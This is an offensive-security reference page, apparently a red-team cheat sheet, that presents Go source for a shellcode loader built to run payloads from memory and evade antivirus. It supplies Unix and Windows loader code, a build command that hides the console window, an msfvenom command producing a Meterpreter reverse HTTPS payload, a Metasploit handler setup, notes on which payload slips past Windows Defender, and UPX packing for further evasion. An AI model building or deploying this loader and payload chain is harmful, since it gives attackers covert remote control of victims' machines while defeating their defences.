# Load shellcode from memory using Golang

This is a program to run shellcode as its own process, all from memory written to defeat anti-virus detection.

Original code by [brimstone](https://github.com/brimstone/go-shellcode) mofified by [JUMPSEC](https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/):


=== "main.go"
	```go
	package main

	import (
		"encoding/hex"
		"fmt"
		"os"

		shellcode "github.com/brimstone/go-shellcode"
	)

	func main() {

		sc :="SHELLCODE-GOES-HERE"
		sc_bin, err := hex.DecodeString(sc)
		if err != nil {
			fmt.Printf("Error decoding arg 1: %s\n", err)
			os.Exit(1)
		}

		shellcode.Run(sc_bin)
	}
	```

=== "shellcode_unix.go"
	```go
	// +build linux freebsd darwin

	package shellcode

	/*
	#include <stdio.h>
	#include <sys/mman.h>
	#include <string.h>
	#include <unistd.h>
	void call(char *shellcode, size_t length) {
		if(fork()) {
			return;
		}
		unsigned char *ptr;
		ptr = (unsigned char *) mmap(0, length, \
			PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
		if(ptr == MAP_FAILED) {
			perror("mmap");
			return;
		}
		memcpy(ptr, shellcode, length);
		( *(void(*) ()) ptr)();
	}
	*/
	import "C"
	import (
		"unsafe"
	)

	func Run(sc []byte) {
		C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
	}
	```

=== "shellcode\_windows.go"
	```go
	package shellcode

	import (
		"syscall"
		"unsafe"
	)

	var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

	func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
		ret, _, _ := procVirtualProtect.Call(
			uintptr(lpAddress),
			uintptr(dwSize),
			uintptr(flNewProtect),
			uintptr(lpflOldProtect))
		return ret > 0
	}

	func Run(sc []byte) {
		// TODO need a Go safe fork
		// Make a function ptr
		f := func() {}

		// Change permissions on f function ptr
		var oldfperms uint32
		if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
			panic("Call to VirtualProtect failed!")
		}

		// Override function ptr
		**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

		// Change permissions on shellcode string data
		var oldshellcodeperms uint32
		if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
			panic("Call to VirtualProtect failed!")
		}

		// Call the function ptr it
		f()
	}

	```

The binary can be built using this command:

```text
GOOS=windows \
GOARCH=amd64 \
go build -ldflags="-s -w -H=windowsgui" \
cmd/sc/main.go
```

To generate the shellcode you can use this command:

```text
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=xxx \
LPORT=xxx \
-b \x00 \
-f hex
```

!!! info
    At the time of writing the `windows/x64/meterpreter/reverse_tcp` payload was flagged by windows defender when executing \(behavior analysis\) but not the `windows/x64/meterpreter/reverse_https`

Starting the handler:

```text
msfconsole -x "use exploit/multi/handler;\
set PAYLOAD windows/x64/meterpreter/reverse_https;\
set LHOST localhost;\
set LPORT 8443;\
run -j"
```

Packing the binary using UPX might help with Antivirus detection:

```text
brew install upx
upx main.exe --brute
```

### References

- https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
- https://github.com/brimstone/go-shellcode



